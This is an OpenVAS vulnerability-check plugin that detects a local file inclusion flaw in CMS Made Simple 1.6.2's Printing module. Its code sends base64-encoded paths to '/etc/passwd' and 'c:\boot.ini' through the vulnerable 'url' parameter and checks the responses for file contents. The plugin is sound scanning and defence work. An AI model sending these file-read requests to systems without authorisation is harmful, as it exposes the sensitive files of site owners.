###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_cms_made_simple_lfi_vuln.nasl 13960 2019-03-01 13:18:27Z cfischer $
#
# CMS Made Simple 'modules/Printing/output.php' Local File Include Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2010 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:cmsmadesimple:cms_made_simple";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.901141");
  script_version("$Revision: 13960 $");
  script_tag(name:"last_modification", value:"$Date: 2019-03-01 14:18:27 +0100 (Fri, 01 Mar 2019) $");
  script_tag(name:"creation_date", value:"2010-08-26 15:28:03 +0200 (Thu, 26 Aug 2010)");
  script_bugtraq_id(36005);
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("CMS Made Simple 'modules/Printing/output.php' Local File Include Vulnerability");

  script_xref(name:"URL", value:"http://www.cmsmadesimple.org/2009/08/05/announcing-cmsms-163-touho/");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2010 SecPod");
  script_family("Web application abuses");
  script_dependencies("cms_made_simple_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("cmsmadesimple/installed");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to obtain potentially sensitive
information and to execute arbitrary local scripts in the context of the webserver process.");

  script_tag(name:"affected", value:"CMS Made Simple version 1.6.2");

  script_tag(name:"insight", value:"The flaw is caused by improper validation of user-supplied input via the
'url' parameter to 'modules/Printing/output.php' that allows remote attackers to view files and execute local
scripts in the context of the webserver.");

  script_tag(name:"solution", value:"Upgrade CMS Made Simple Version 1.6.3 or later.");

  script_tag(name:"summary", value:"This host is running CMS Made Simple and is prone to local file inclusion
vulnerability.");

  script_xref(name:"URL", value:"http://www.cmsmadesimple.org/downloads/");
  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

foreach file (make_list("L2V0Yy9wYXNzd2Q=","YzpcYm9vdC5pbmk=")) {
  url = dir + "/modules/Printing/output.php?url=" + file;
  if(http_vuln_check(port: port, url: url, pattern: "(root:.*:0:[01]:|\[boot loader\])")) {
    report = report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
